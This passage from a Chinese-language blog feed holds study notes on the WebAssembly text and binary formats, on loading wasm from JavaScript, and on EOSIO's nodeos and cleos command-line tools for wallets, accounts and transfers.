href="https://www.jianshu.com/p/58265c587cbf）" target="_blank" rel="noopener">https://www.jianshu.com/p/58265c587cbf）</a></p><p>首先加一个按钮:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button class&#x3D;&quot;mybutton&quot;&gt;Run myFunction&lt;&#x2F;button&gt;</span><br></pre></td></tr></table></figure><p>然后在按钮下方的script中添加script代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">document.querySelector(&#39;.mybutton&#39;)</span><br><span class="line">    .addEventListener(&#39;click&#39;, function() &#123;</span><br><span class="line">        alert(&#39;check console&#39;);</span><br><span class="line">        var result &#x3D; Module.ccall(</span><br><span class="line">            &#39;myFunction&#39;,&#x2F;&#x2F; name of C function</span><br><span class="line">            null,&#x2F;&#x2F; return type</span><br><span class="line">            null,&#x2F;&#x2F; argument types</span><br><span class="line">            null&#x2F;&#x2F; arguments</span><br><span class="line">        );</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/21/cMiPpogzqQDW84w.png" alt="image-20210321204339596"></p><p><img src="https://i.loli.net/2021/03/21/PRCBQpZyS3fw9Vk.png" alt="image-20210321204400100"></p><h1 id="WebAssembly文本格式"><a href="#WebAssembly文本格式" class="headerlink" title="WebAssembly文本格式"></a>WebAssembly文本格式</h1><p>不管是二进制格式还是文本格式，WebAssembly的基本代码单元都是一个模块。表示为一个S表达式。其实就是个平面树的结构。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(module (memory 1) (func))</span><br></pre></td></tr></table></figure><p>每个节点放在一对括号内，比如根节点就是module，子节点有两个，memory和func, 1是memory节点的属性。</p><p><strong>模块中添加功能</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(func (签名) (本地类型声明) (body))</span><br></pre></td></tr></table></figure><p>签名其实也是参数类型声明，如果有返回值，后面还会跟返回类型声明。类型只有四种：i32, i63, f32, f63</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(func (param i32) (param i32) (result f64) (本地类型声明) (body))</span><br></pre></td></tr></table></figure><p>两个i32的参数，返回值是f64类型的。</p><p>本地类型声明实质是获取参数和返回值的类型。使用local.get 0这种，0代表第一个参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(func (param i32) (param f32) (local f64)</span><br><span class="line">  local.get 0&#x2F;&#x2F;i32</span><br><span class="line">  local.get 1&#x2F;&#x2F;f32</span><br><span class="line">  local.get 2)&#x2F;&#x2F;f64</span><br></pre></td></tr></table></figure><p>这种通过数字获取类型不太行，最好就是给每个参数都加一个名称，然后去get它。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(func (param $p1 i32) (param $p2 f32) local.get $p1 local.get $p2 …)</span><br></pre></td></tr></table></figure><p>local.get是将获得的值压栈，出栈用add。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(func (param $p i32)</span><br><span class="line">  (result i32)</span><br><span class="line">  local.get $p</span><br><span class="line">  local.get $p</span><br><span class="line">  i32.add)</span><br></pre></td></tr></table></figure><p>弹出两个i32值，如果是弹出f32, 使用f32.add</p><p><strong>调用函数</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(module</span><br><span class="line">  (func $add (param $lhs i32) (param $rhs i32) (result i32)</span><br><span class="line">    local.get $lhs</span><br><span class="line">    local.get $rhs</span><br><span class="line">    i32.add)</span><br><span class="line">  (export &quot;add&quot; (func $add))</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>给func函数起名$add, 之后export中调用。将模块保存为add.wat, 之后wabt转换成add.wasm。</p><p><strong>同一模块中的其它函数调用函数</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(module</span><br><span class="line">  (func $getAnswer (result i32)</span><br><span class="line">    i32.const 42)</span><br><span class="line">  (func (export &quot;getAnswerPlus1&quot;) (result i32)</span><br><span class="line">    call $getAnswer</span><br><span class="line">    i32.const 1</span><br><span class="line">    i32.add))</span><br></pre></td></tr></table></figure><p>第二个函数调用第一个函数。</p><p><strong>声明全局变量</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(module</span><br><span class="line">   (global $g (import &quot;js&quot; &quot;global&quot;) (mut i32))</span><br><span class="line">   (func (export &quot;getGlobal&quot;) (result i32)</span><br><span class="line">        (global.get $g))</span><br><span class="line">   (func (export &quot;incGlobal&quot;)</span><br><span class="line">        (global.set $g</span><br><span class="line">            (i32.add (global.get $g) (i32.const 1))))</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h1 id="文本格式与二进制转换"><a href="#文本格式与二进制转换" class="headerlink" title="文本格式与二进制转换"></a>文本格式与二进制转换</h1><p>git下载</p><p><code>git clone --recursive https://gitee.com/ggy666/wabt.git</code></p><p>github原因之后有好几个都下载不了，只能去到GitHub下载下来然后复制到third_party。之后执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir build &amp;&amp; cd build</span><br><span class="line">cmake ..</span><br><span class="line">cmake --build .</span><br></pre></td></tr></table></figure><p>但还是报错。。莫得办法了。</p><p>wast-&gt;wasm: <a href="https://cdn.rawgit.com/WebAssembly/sexpr-wasm-prototype/2bb13aa785be9908b95d0e2e09950b39a26004fa/demo/index.html" target="_blank" rel="noopener">https://cdn.rawgit.com/WebAssembly/sexpr-wasm-prototype/2bb13aa785be9908b95d0e2e09950b39a26004fa/demo/index.html</a></p><p>wasm-&gt;wast: <a href="https://webassembly.github.io/wabt/demo/" target="_blank" rel="noopener">https://webassembly.github.io/wabt/demo/</a></p><h1 id="二进制格式"><a href="#二进制格式" class="headerlink" title="二进制格式"></a>二进制格式</h1><p>WebAssembly, 使用LEB128编码，因此有效位是7位，剩余一位表示是否终结的标志位。如果标志位是1，表示编码的数据还没结束。</p><p>wasm是二进制格式，采用小端存储。</p><p>参考这个解析:<a href="https://www.jianshu.com/p/2f18b33ee389" target="_blank" rel="noopener">https://www.jianshu.com/p/2f18b33ee389</a></p><p>下面段截图来源: <a href="https://cdn.rawgit.com/WebAssembly/sexpr-wasm-prototype/2bb13aa785be9908b95d0e2e09950b39a26004fa/demo/index.html" target="_blank" rel="noopener">https://cdn.rawgit.com/WebAssembly/sexpr-wasm-prototype/2bb13aa785be9908b95d0e2e09950b39a26004fa/demo/index.html</a></p><p>与解析有出入，所以看得不太懂。</p><h2 id="段类型"><a href="#段类型" class="headerlink" title="段类型"></a>段类型</h2><p>模块主要由多个段组成。每个段对应一个ID。</p><table><thead><tr><th>ID</th><th>段</th><th>用处</th></tr></thead><tbody><tr><td>０</td><td>自定义段</td><td>用于存储调试信息</td></tr><tr><td>１</td><td>类型段（Type）</td><td>存储导入函数，模块内部函数的函数参数列表</td></tr><tr><td>２</td><td>导入段（import）</td><td>存储导入函数的名称，参数索引</td></tr><tr><td>３</td><td>函数段（Function）</td><td>存储函数索引值</td></tr><tr><td>４</td><td>表格段（Table）</td><td>存储对象引用，实现函数指针功能，可导入也可导出</td></tr><tr><td>５</td><td>内存段（Memory）</td><td>存储程序运行时动态数据，可导入导出</td></tr><tr><td>６</td><td>全局段（Global）</td><td>存储全部变量值</td></tr><tr><td>７</td><td>导出段（Export）</td><td>存储导出函数的名称，参数索引</td></tr><tr><td>８</td><td>开始段（Start）</td><td>指定模块初始化时的函数索引值</td></tr><tr><td>９</td><td>元素段（Elem）</td><td>表格段没有显式初始化，存储函数的索引值</td></tr><tr><td>１０</td><td>代码段（Code）</td><td>存储函数的指令代码</td></tr><tr><td>１１</td><td>数据段（Data）</td><td>存储初始化内存的静态数据</td></tr></tbody></table><h2 id="头部"><a href="#头部" class="headerlink" title="头部"></a>头部</h2><p>头部有8字节，前四个字节是：00 61 73 6d, 对应字符串“\x00asm”, 其实就是0x6d736100。后面四个字节代表版本号。</p><p><img src="https://i.loli.net/2021/03/23/86nueJN2sTamYKc.png" alt="image-20210323114612298"></p><h2 id="自定义段"><a href="#自定义段" class="headerlink" title="自定义段"></a>自定义段</h2><p>还没有。</p><h2 id="类型段"><a href="#类型段" class="headerlink" title="类型段"></a>类型段</h2><p><img src="https://i.loli.net/2021/03/23/F3SL5EIQTRh6Jdm.png" alt="image-20210323115709774"></p><h2 id="函数段"><a href="#函数段" class="headerlink" title="函数段"></a>函数段</h2><p><img src="https://i.loli.net/2021/03/23/MIXRQoe2ZNPJiGm.png" alt="image-20210323120102491"></p><h2 id="导入段"><a href="#导入段" class="headerlink" title="导入段"></a>导入段</h2><p><img src="https://i.loli.net/2021/03/23/noSNf4kj5v2YT7D.png" alt="image-20210323120234648"></p><h2 id="导出段"><a href="#导出段" class="headerlink" title="导出段"></a>导出段</h2><p><img src="https://i.loli.net/2021/03/23/p1nKcCwmFav7bRf.png" alt="image-20210323120120944"></p><h2 id="代码段"><a href="#代码段" class="headerlink" title="代码段"></a>代码段</h2><p><img src="https://i.loli.net/2021/03/23/iy9CVab4xfLJhgN.png" alt="image-20210323120145065"></p><h2 id="表格段"><a href="#表格段" class="headerlink" title="表格段"></a>表格段</h2><p><img src="https://i.loli.net/2021/03/23/I6wncy8RsUJHSMD.png" alt="image-20210323120257090"></p><h2 id="内存段"><a href="#内存段" class="headerlink" title="内存段"></a>内存段</h2><p><img src="https://i.loli.net/2021/03/23/hYVbNukS5TZCfp8.png" alt="image-20210323120335459"></p><h2 id="开始段"><a href="#开始段" class="headerlink" title="开始段"></a>开始段</h2><p><img src="https://i.loli.net/2021/03/23/Pme1wOzWTpHtnFh.png" alt="image-20210323120351979"></p><h2 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h2><p><img src="https://i.loli.net/2021/03/23/3ZcEj6eTtdAHGFk.png" alt="image-20210323120424011"></p><h1 id="使用XMLHttpRequest调用wasm"><a href="#使用XMLHttpRequest调用wasm" class="headerlink" title="使用XMLHttpRequest调用wasm"></a>使用XMLHttpRequest调用wasm</h1><p>html文件如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;xhr&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;test&lt;&#x2F;p&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">var importObject &#x3D; &#123;</span><br><span class="line">imports:&#123;</span><br><span class="line">imported_func: function(arg)&#123;</span><br><span class="line">console.log(arg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">request &#x3D; new XMLHttpRequest();</span><br><span class="line">request.open(&#39;GET&#39;, &#39;simple.wasm&#39;);</span><br><span class="line">request.responseType &#x3D; &#39;arraybuffer&#39;;</span><br><span class="line">request.send();</span><br><span class="line"></span><br><span class="line">request.onload &#x3D; function() &#123;</span><br><span class="line">  var bytes &#x3D; request.response;</span><br><span class="line">  WebAssembly.instantiate(bytes, importObject).then(results &#x3D;&gt; &#123;</span><br><span class="line">    results.instance.exports.exported_func();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>注意，需要先创建一个importObject才行，而且它要满足wasm里的内容。也就是说，换一个wasm会运行错误的。</p><p><strong>看一下simple.wasm内容:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0061 736d 0100 0000 0108 0260 017f 0060</span><br><span class="line">0000 0219 0107 696d 706f 7274 730d 696d</span><br><span class="line">706f 7274 6564 5f66 756e 6300 0003 0201</span><br><span class="line">0107 1101 0d65 7870 6f72 7465 645f 6675</span><br><span class="line">6e63 0001 0a08 0106 0041 2a10 000b</span><br></pre></td></tr></table></figure><p>转成wat看一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(module</span><br><span class="line">  (type $t0 (func (param i32)))</span><br><span class="line">  (type $t1 (func))</span><br><span class="line">  (import &quot;imports&quot; &quot;imported_func&quot; (func $imports.imported_func (type $t0)))</span><br><span class="line">  (func $exported_func (export &quot;exported_func&quot;) (type $t1)</span><br><span class="line">    (call $imports.imported_func</span><br><span class="line">      (i32.const 42))))</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;由于EOSIO在编译智能合约时会将CPP文件编译成wasm文件，因此需要好好了解一下wasm—WebAssembly。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="区块链安全之WebAssembly" scheme="https://ggyggy666.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E4%B9%8BWebAssembly/"/>
    
  </entry>
  
  <entry>
    <title>区块链安全之EOSIO相关工具的使用</title>
    <link href="https://ggyggy666.github.io/2021/03/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E4%B9%8BEOSIO%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>https://ggyggy666.github.io/2021/03/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E4%B9%8BEOSIO%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
    <published>2021-03-20T07:17:15.000Z</published>
    <updated>2021-03-21T10:45:43.817Z</updated>
    
    <content type="html"><![CDATA[<p>先前已经学会了编写智能合约并编译部署，但对于使用到的工具比如nodeos, cleos并不熟悉，因此学习一下。</p><p>来源:<a href="https://developers.eos.io/manuals/eos/latest/nodeos/index" target="_blank" rel="noopener">https://developers.eos.io/manuals/eos/latest/nodeos/index</a></p><a id="more"></a><h1 id="nodeos"><a href="#nodeos" class="headerlink" title="nodeos"></a>nodeos</h1><p>nodeos是在每个EOSIO节点上运行的核心服务守护程序，可以配置为处理智能合约，验证交易，产生包含有效交易的区块，确认区块并将其记录在区块链上。</p><p>nodeos主要是加载插件，选项有nodeos特定的以及插件特定的。</p><ul><li><p>nodeos特定的选项</p><p>用于内部管理。可以使用<code>nodeos --help</code>可以看到特定于nodeos的选项。</p></li><li><p>插件特定的选项</p><p>用于控制nodeos插件，每个插件有唯一名称，因此可以–plugin指定它。有些插件固定：chain_plugin, net_plugin, producer_plugin。有两种配置方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.config.ini</span><br><span class="line">plugin &#x3D; eosio::net_api_plugin</span><br><span class="line"></span><br><span class="line">2.cli</span><br><span class="line">nodeos ... --plugin eosio::net_api_plugin</span><br></pre></td></tr></table></figure></li></ul><h1 id="cleos"><a href="#cleos" class="headerlink" title="cleos"></a>cleos</h1><p>命令行工具，可以用来部署和测试智能合约。需要先启动Nodeos实例，而且实例配置为：eosio::chain_api_plugin在启动时加载插件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos --help</span><br></pre></td></tr></table></figure><ul><li>-u, 指定nodeos运行的ip和端口。</li><li>–wallet-url, 指定keosd运行的URL</li><li>-r, 传递http头部</li><li>-n, 使用HTTPS时不验证证书。</li><li>–no-auto-keosd，keosd没有运行时不自动加载。</li><li>-v, 输出详细的错误和action信息</li><li>–print-request, 打印HTTP请求</li><li>–print-response, 打印HTTP响应</li><li>version, 返回版本信息。<code>cleos version</code>, <code>cleos version client</code></li><li>create, 创建各种项目，打开和关闭区块链</li><li>convert, 打包或者卸载交易</li><li>get，返回各种关于区块链的信息</li><li>set, 设置或者更新区块链状态</li><li>transfer, 在账户之间传送token</li><li>net, 与本地的p2p网络连接交互</li><li>wallet，与本地钱包交互</li><li>sign, 给一个交易签名</li><li>push，推送任意的交易到区块链</li><li>multisig,  对合约命令多重签名</li><li>wrap, 包装合约命令</li><li>system, 发送eosio.system 合约action到区块链</li></ul><p>还有子命令的帮助信息，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos create --help</span><br></pre></td></tr></table></figure><p>查看create子命令的信息。返回</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key, 创建密钥打印公钥和私钥。</span><br><span class="line">account, 创建新的账户。</span><br></pre></td></tr></table></figure><p>然后继续查询子命令帮助信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos create account --help</span><br></pre></td></tr></table></figure><p>返回一堆信息，自己看就是了。</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p><strong>创建钱包</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#-n后是钱包名字，--to-console是将钱包密码显示在屏幕</span><br><span class="line">cleos wallet create -n mywallet --to-console</span><br><span class="line"></span><br><span class="line">#-f后是文件名，将密码保存到文件中</span><br><span class="line">cleos wallet create -n mywallet -f default_wallet.pwd</span><br></pre></td></tr></table></figure><p><strong>为账户购买0.1SYStoken的RAM</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos system buyram alice alice &quot;0.1SYS&quot; -p alice@active</span><br></pre></td></tr></table></figure><p><strong>配置多重签名账户</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos set account permission multisig active &#39;&#123;\&quot;threshold\&quot; : 1, \&quot;accounts\&quot; :[&#123;\&quot;permission\&quot;:&#123;\&quot;actor\&quot;:\&quot;eosio\&quot;,\&quot;permission\&quot;:\&quot;active\&quot;&#125;,\&quot;weight\&quot;:1&#125;,&#123;\&quot;permission\&quot;:&#123;\&quot;actor\&quot;:\&quot;customera\&quot;,\&quot;permission\&quot;:\&quot;active\&quot;&#125;,\&quot;weight\&quot;:1&#125;]&#125;&#39; owner -p multisig@owner&quot;</span><br></pre></td></tr></table></figure><p><strong>连接到特定nodeos或keosd</strong></p><p>使用–url或–wallet-url, 不过不加参数就默认连接到127.0.0.1:8888</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#nodeos</span><br><span class="line">cleos -url http:&#x2F;&#x2F;nodeos-host:8888 命令</span><br><span class="line">#keosd</span><br><span class="line">cleos --wallet-url http:&#x2F;&#x2F;keosd-host:8888 命令</span><br></pre></td></tr></table></figure><p><strong>创建账户</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos create account creator name OwnerKey [ActiveKey]</span><br></pre></td></tr></table></figure><p><strong>创建密钥对</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#将密钥输出到控制台</span><br><span class="line">cleos create key --to-console</span><br><span class="line">#保存到文件</span><br><span class="line">cleos create key --file xxx</span><br></pre></td></tr></table></figure><p><strong>分配CPU资源</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos system delegatebw bob alice &quot;0 SYS&quot; &quot;0.01 SYS&quot;</span><br></pre></td></tr></table></figure><p>bob给alice分配资源，0 SYS的网络带宽，0.01 SYS的CPU带宽。</p><p><strong>分配带宽</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos system delegatebw bob alice <span class="string">"0.01 SYS"</span> <span class="string">"0 SYS"</span></span><br></pre></td></tr></table></figure><p><strong>部署智能合约</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos set contract contract_account contract_folder [wasm-file] [abi-file]</span><br></pre></td></tr></table></figure><p><strong>获取账户信息</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos get account 账户名</span><br></pre></td></tr></table></figure><p><strong>获取区块信息</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos get block 区块号或ID</span><br></pre></td></tr></table></figure><p><strong>获取表信息</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos get table 账户 SCOPE TABLE</span><br></pre></td></tr></table></figure><p><strong>获取交易信息</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos get transaction 交易id</span><br></pre></td></tr></table></figure><p><strong>导入密钥</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos wallet import</span><br></pre></td></tr></table></figure><p>然后输入密钥即可。</p><p><strong>链接权限</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos set action permission alice hodlcontract transfer permlvl</span><br></pre></td></tr></table></figure><p>将权限链接permlvl到actionhodlcontract合约的transfer行为</p><p><strong>列出所有密钥对</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#解锁钱包</span><br><span class="line">cleos wallet unlock</span><br><span class="line"></span><br><span class="line">#列出公钥和私钥</span><br><span class="line">cleos wallet keys</span><br><span class="line">cleos wallet private_keys</span><br></pre></td></tr></table></figure><p><strong>占用网络带宽</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos system delegatebw alice alice &quot;0 SYS&quot; &quot;0.01 SYS&quot;</span><br></pre></td></tr></table></figure><p><strong>提交交易</strong></p><p>创建一个有效交易的JSON代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;expiration&quot;: &quot;2019-08-01T07:15:49&quot;,</span><br><span class="line">  &quot;ref_block_num&quot;: 34881,</span><br><span class="line">  &quot;ref_block_prefix&quot;: 2972818865,</span><br><span class="line">  &quot;max_net_usage_words&quot;: 0,</span><br><span class="line">  &quot;max_cpu_usage_ms&quot;: 0,</span><br><span class="line">  &quot;delay_sec&quot;: 0,</span><br><span class="line">  &quot;context_free_actions&quot;: [],</span><br><span class="line">  &quot;actions&quot;: [&#123;</span><br><span class="line">      &quot;account&quot;: &quot;eosio.token&quot;,</span><br><span class="line">      &quot;name&quot;: &quot;transfer&quot;,</span><br><span class="line">      &quot;authorization&quot;: [&#123;</span><br><span class="line">          &quot;actor&quot;: &quot;han&quot;,</span><br><span class="line">          &quot;permission&quot;: &quot;active&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      &quot;data&quot;: &quot;000000000000a6690000000000ea305501000000000000000453595300000000016d&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;transaction_extensions&quot;: [],</span><br><span class="line">  &quot;context_free_data&quot;: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos push transaction xxx.json</span><br></pre></td></tr></table></figure><p>通过JSON提交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos push transaction JSON</span><br></pre></td></tr></table></figure><p><strong>转移token</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos transfer alice bob &quot;0.0001 SYS&quot; &quot;Hodl!&quot; -p alice@active</span><br></pre></td></tr></table></figure><p>将0.0001 SYS的token从alice转移到bob</p><p><strong>取消删除CPU资源</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos system undelegatebw bob alice &quot;0 SYS&quot; &quot;0.01 SYS&quot;</span><br></pre></td></tr></table></figure><p>将0.01 SYSCPU带宽从alice返回到bob.网络带宽类似。</p><p><strong>删除链接的权限基本</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos set action permission alice hodlcontract transfer NULL</span><br></pre></td></tr></table></figure><p>删除一个链接到hodlcontract合约的transfer行为的权限。</p><p><strong>取消CPU</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos system undelegatebw alice alice &quot;0.01 SYS&quot; &quot;0 SYS&quot;</span><br></pre></td></tr></table></figure><p>投票</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos system voteproducer prods eosiotestts2 blockproducer1 blockproducer2</span><br></pre></td></tr></table></figure><p>从eosiotestts2账户向blockproducer1和blockproducer2投票</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;先前已经学会了编写智能合约并编译部署，但对于使用到的工具比如nodeos, cleos并不熟悉，因此学习一下。&lt;/p&gt;
&lt;p&gt;来源:&lt;a href=&quot;https://developers.eos.io/manuals/eos/latest/nodeos/index&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://developers.eos.io/manuals/eos/latest/nodeos/index&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="BlockChain" scheme="https://ggyggy666.github.io/categories/BlockChain/"/>
    
    
      <category term="区块链安全之EOSIO相关工具的使用" scheme="https://ggyggy666.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E4%B9%8BEOSIO%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>区块链安全之EOS学习（三）</title>
